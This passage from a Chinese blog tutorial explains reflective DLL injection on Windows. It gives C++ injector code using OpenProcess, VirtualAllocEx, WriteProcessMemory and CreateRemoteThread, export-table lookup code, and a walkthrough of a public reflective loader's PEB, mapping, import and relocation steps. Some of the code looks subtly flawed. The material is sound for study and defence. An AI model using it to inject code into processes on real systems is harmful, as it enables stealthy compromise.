class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (hProcess == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Allocate Address or Open Process Failed\n&quot;</span>;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">LPVOID pBase = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pBase == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Allocate Memory Failed\n&quot;</span>;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>* buffer = <span class="keyword">new</span> <span class="type">char</span>[dwFileSize];</span><br><span class="line">DWORD dwReadSize;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ReadFile</span>(hFile, buffer, dwFileSize, &amp;dwReadSize, <span class="literal">NULL</span>) == FALSE) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read the file.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pBase, buffer, dwFileSize, &amp;dwWriteSize);</span><br><span class="line"><span class="keyword">if</span> (dwWriteSize != dwFileSize) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;File Load partitially\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>获得<code>loader</code>函数地址</p><p>按照之前提到的pe格式，就是从<code>IMAGE_DATA_DIRECTORY</code>的导出表中，利用<code>FirstThunk</code>进行遍历，如果字符串匹配，就根据结构体的相关变量找到函数地址</p><p>首先是得到RVA转换的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">VA2RVA</span><span class="params">(DWORD64 dwRva, DWORD64 BaseAddress)</span> </span>&#123;</span><br><span class="line">    DWORD64 VA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 RVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 sectionHeader;</span><br><span class="line"></span><br><span class="line">    DWORD64 ntheader = BaseAddress + ((PIMAGE_DOS_HEADER)BaseAddress)-&gt;e_lfanew;</span><br><span class="line">    WORD sectionNum = ((PIMAGE_NT_HEADERS64)ntheader)-&gt;FileHeader.NumberOfSections;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sectionHeader = ntheader + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">        <span class="keyword">if</span> (((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;VirtualAddress &gt; dwRva)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        VA = ((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;VirtualAddress;</span><br><span class="line">        RVA = dwRva - VA + ((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;PointerToRawData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> RVA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要说明下<code>IMAGE_EXPORT_DIRECTORY</code>导出表目录结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@[comment(&quot;MVI_tracked&quot;)]</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><ul><li><code>AddressOfNames</code>：函数名称地址DWORD数组，需要RVA</li><li><code>AddressOfFunctions</code>：Export函数地址DWORD数组，需要RVA</li><li><code>AddressOfNameOrdinals</code>：这是WORD数组，举个例子：目前存在着两个数组，<code>AddressOfNames[i]</code>和<code>AddressOfFunctions[j]</code>，<code>AddressOfNameOrdinals</code>存在的意义就是可以通过下标<code>i</code>找到另一个<code>j</code>，类似数据库中的<strong>关系表</strong></li></ul><p>拿到<code>AddressOfNames</code>去比较得到<code>i</code>，然后使用<code>i</code>从<code>AddressOfNameOrdinals</code>得到<code>j</code>，最后使用<code>j</code>从<code>AddressOfFunctions</code>找到函数地址</p><p>注意得是<code>AddressOfNames</code>是一个DWORD数组，并且需要根据DWORD数据重定位才能得到函数名。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD64 <span class="title">getFunctionOffset</span><span class="params">(HANDLE peBuffer, <span class="type">const</span> <span class="type">char</span>* funcionName)</span> </span>&#123;</span><br><span class="line">    DWORD64 dosHeader = (DWORD64)peBuffer;</span><br><span class="line">    DWORD64 ntHeader = dosHeader + ((PIMAGE_DOS_HEADER)peBuffer)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//导入目录</span></span><br><span class="line">    DWORD64 eatDVA = ((PIMAGE_NT_HEADERS64)ntHeader)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line"></span><br><span class="line">    DWORD64 exportDirRVA = <span class="built_in">VA2RVA</span>(eatDVA, dosHeader) + dosHeader;</span><br><span class="line">    DWORD64 exportNameAddr = <span class="built_in">VA2RVA</span>(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfNames, dosHeader) + dosHeader;</span><br><span class="line">    DWORD64 exportFuncAddr = <span class="built_in">VA2RVA</span>(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfFunctions, dosHeader) + dosHeader;</span><br><span class="line">    DWORD64 exportOrdinals = <span class="built_in">VA2RVA</span>(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfNameOrdinals, dosHeader) + dosHeader;</span><br><span class="line"></span><br><span class="line">    DWORD sumNames = ((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.遍历找到i</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; sumNames; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span>* cpExportedFunctionName = (<span class="type">char</span>*)(dosHeader + <span class="built_in">VA2RVA</span>((<span class="built_in">PDWORD</span>(exportNameAddr))[i], dosHeader));</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;func: &quot;</span> &lt;&lt; cpExportedFunctionName &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(cpExportedFunctionName, funcionName)) &#123;</span><br><span class="line">            exportFuncAddr += (<span class="built_in">PWORD</span>(exportOrdinals)[i]);</span><br><span class="line">            <span class="keyword">return</span>  <span class="built_in">VA2RVA</span>(<span class="built_in">PDWORD</span>(exportFuncAddr)[<span class="number">0</span>], dosHeader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在远程进程中加载</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">DWORD64 loaderFuncAddr = <span class="built_in">getFunctionOffset</span>(buffer, <span class="string">&quot;loader&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (loaderFuncAddr == <span class="number">0</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Get Export Function Error\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPTHREAD_START_ROUTINE lpReflectiveLoader = <span class="built_in">reinterpret_cast</span>&lt;LPTHREAD_START_ROUTINE&gt;(</span><br><span class="line">    <span class="built_in">reinterpret_cast</span>&lt;ULONG_PTR&gt;(pBase) + loaderFuncAddr</span><br><span class="line">    );</span><br><span class="line">   </span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">1024</span> * <span class="number">1024</span>, lpReflectiveLoader, pBase, (DWORD)<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == INVALID_HANDLE_VALUE || hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Create Thread Failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">500</span>);</span><br><span class="line">   </span><br><span class="line"><span class="keyword">delete</span>[] buffer;</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br></pre></td></tr></table></figure></li></ol><p>这里我是用 <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 的DLL进行测试，函数名为<code>ReflectiveLoader</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151719965.png" alt="image-20250103214642081" /></p><h2 id="关于peb"><a class="markdownIt-Anchor" href="#关于peb"></a> 关于PEB</h2><p>PEB：process environment block，处理环境块。可以参考：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb">https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">  BYTE                          BeingDebugged;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">  PPEB_LDR_DATA                 Ldr;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure><ul><li><code>BeingDebugged</code>：当前是否被调试，反调试和反反调试常用</li><li><code>Ldr</code>：该结构包含有关进程已加载模块的信息</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA</span></span><br><span class="line">&#123;</span><br><span class="line">   DWORD dwLength;</span><br><span class="line">   DWORD dwInitialized;</span><br><span class="line">   LPVOID lpSsHandle;</span><br><span class="line">   LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">   LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">   LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">   LPVOID lpEntryInProgress;</span><br><span class="line">&#125; PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure><p>当程序每加载一个dll的时候，就会添加到<code>InMemoryOrderModuleList</code>中（三个<code>LIST_ENTRY</code>都会添加），<code>LIST_ENTRY</code>可以被解析为<code>LDR_DATA_TABLE_ENTRY</code>，因为数据间隔对的上…所以很抽象</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY</span> &#123;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line"><span class="comment">//...   </span></span><br><span class="line">    PVOID DllBase;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><p>通过<code>FullDllName</code>可以得到当前dll的完整名称（带有路径），同时<code>DllBase</code>指向该dll的基地址（即加入到内存中的其实地址）</p><h2 id="dll编写"><a class="markdownIt-Anchor" href="#dll编写"></a> DLL编写</h2><p>首先就是loader函数，由于我们是在PE文件没有完成映射到内存时进行调用的，那么这段函数本质上和shellcode一样是一段地址无关代码。我们应该明确这段函数能执行以下任务：</p><ul><li>获得当前内存地址，方便后续解析PE文件</li><li>从<code>peb-&gt;ldr</code>获得相关函数，如<code>GetProcAddress</code>、<code>VirtualAlloc</code>、<code>Loadlibrary</code>等</li><li>解析PE文件得到完成映射后的大小并<code>VirtualAlloc</code>分配内存</li><li>完成Section段的映射</li><li>遍历导入表，使用<code>Loadlibrary</code>加载本dll所需要的各种函数</li><li>处理重定位</li><li>获得PE文件中<code>AddressOfEntryPoint</code>完成映射后的地址，然后跳转执行</li></ul><p>整个过程也是非常枯燥的，以<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 举例</p><ol><li><p>获得当前内存地址，方便后续解析PE文件。首先我们要得到当前PE文件的起始部分， 项目是通过<code>#pragma intrinsic</code>返回函数调用的返回地址，然后判断DOS头和NT头是否匹配来逐步调整，得到PE文件起始地址<code>fileBase</code>。</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151727369.png" alt="image-20250105153732219" /></p></li><li><p>从<code>peb-&gt;ldr</code>获得相关函数。项目为了做到良好的兼容性使用的是<code>__readgsqword</code>和<code>_MoveFromCoprocessor</code>（ARM），函数的作用是从相对于 GS 段开头的偏移量指定的位置读取内存，比如在GS偏移为0x60的位置就是<code>PEB</code>存放的位置，通过遍历PEB中的LDR可以找到所有被加载的dll的相关信息，甚至是在内存中未被映射的PE文件，例如：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151733174.png" alt="image-20250105154150671" /></p><p>项目的这一步做的过程是差不多的，</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151737533.png" alt="image-20250105154538122" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151741450.png" alt="image-20250105154515644" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151745741.png" alt="image-20250105155234308" /></p><p>通过解析<code>kernel32.dll</code>，<code>ntdll.dll</code>的在内存中PE文件，计算出<code>LoadLibraryA</code>，<code>GetProAddress</code>，<code>VritualAlloc</code>，<code>NtFlushInstructionCache</code>三个函数在内存中的位置，便于后续调用。这里的<code>NtFlushInstructionCache</code>函数，用于刷新指定进程的指令缓存</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">NtFlushInstructionCache</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T RegionSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>如果是在用户层使用的话是封装在<code>kernel32.dll</code>的<code>FlushInstructionCache</code>中的，不过直接调用可以避免一些不必要的“检查”</p></li><li><p>完成映射。现在我们得到了当前dll的PE文件起始位置，可以通过NT头中<code>OptionalHeader</code>的<code>SizeOfImage</code>得到完成映射所需要的空间大小，然后用步骤2中找到的<code>VirtualAlloc</code>申请空间，得到内存映射的起始地址<code>memBase</code>。然后先把DOS头和NT头复制过去，当然头的大小也是由<code>OptionalHeader</code>的<code>SizeOfHeaders</code>可以得到的</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151750633.png" alt="image-20250105155757072" /></p></li><li><p>完成Section段的映射</p><p>这里就不得不复习Section头的结构体了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line"> &#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>完成映射的首要问题就是：从哪里，到哪里，走多少。对应的就是从<code>fileBase</code>+<code>PointerToRawData</code>到<code>memBase</code>+<code>VirtualAddress</code>，复制<code>SizeOfRawData</code>大小</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151755783.png" alt="image-20250105160856920" /></p></li><li><p>遍历导入表。为了便于分析再次展示<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;         </span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp; </span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"> <span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><ul><li><code>OriginalFirstThunk</code>：导入名称表的RVA地址</li><li><code>Name</code>：DLL（映像文件）名称</li><li><code>FirstThunk</code>：导入地址表的RVA地址</li></ul><p>根据之前我们对PE文件格式的分析，我们首先得到的是DLL的文件名，这时候便可用之前找到的<code>LoadLibraryA</code>去加载这些<strong>我们DLL需要的DLL</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151801023.png" alt="image-20250105164438130" /></p><p>接着很自然的想到使用<code>GetProAddress</code>去加载这些函数。具体过程是从<code>FirstThunk</code>中获得<code>IMAGE_IMPORT_BY_NAME </code>，得到函数名称后使用<code>GetProAddress</code>得到函数地址，最后存储到<code>fileBase</code>+<code>PIMAGE_IMPORT_DESCRIPTOR.FirstThunk</code>上。</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151804670.png" alt="image-20250105171719814" /></p><p>项目这里对于其他从<code>OriginalFirstThunk</code>开始的情况进行了解析，但是核心思路是一致的。</p></li><li><p>处理重定位。这里有之前PE文件没有说的<code>PIMAGE_BASE_RELOCATION</code>（主要是之前的例子是EXE）</p><p>为什么DLL需要重定位？每个DLL最初被设计时，编译器会为其分配一个<strong>首选加载地址</strong>（Preferred Base Address），这通常是一个固定的虚拟内存地址。当多个DLL被加载到同一个进程的地址空间时，如果多个DLL的首选加载地址发生冲突（即两个DLL都希望加载到同一个内存地址），<strong>操作系统无法直接将它们加载到相同的地址</strong>，为了避免这种冲突，操作系统会将其中一个或多个DLL加载到其他地址，这就需要对代码中的绝对地址进行<strong>重定位</strong>。</p><p>他保存在NT头的<code>OptionalHeader.DataDirectory</code>中，结构体如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@[comment(&quot;MVI_tracked&quot;)]</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_BASE_RELOCATION</span> &#123;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><ul><li><code>VirtualAddress</code>：待修正的数据的起始RVA</li><li><code>SizeOfBlock</code>：要修正的区块数目</li></ul><p>在PE格式中一个<code>IMAGE_BASE_RELOCATION</code>数组展现的，这也方便我们进行遍历，最后一个全部成员变量都为0，所以计算要重定位的区块数目的时候记得**-1**。</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151810484.png" alt="image-20250105173117037" /></p><p>如何进行修正？<code>PIMAGE_BASE_RELOCATION</code>有一个隐藏的成员<code>TypeOffset</code>，可以通过<code>IMAGE_BASE_RELOCATION+ sizeof(IMAGE_BASE_RELOCATION)</code>找到，可以被解析为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">WORDoffset:<span class="number">12</span>;</span><br><span class="line">WORDtype:<span class="number">4</span>;</span><br><span class="line">&#125; IMAGE_RELOC, *PIMAGE_RELOC;</span><br></pre></td></tr></table></figure><p>其中重定位的类型主要是构架的不同导致的，如32位和64位</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Based relocation types.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_ABSOLUTE              0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGH                  1</span></span><br><span 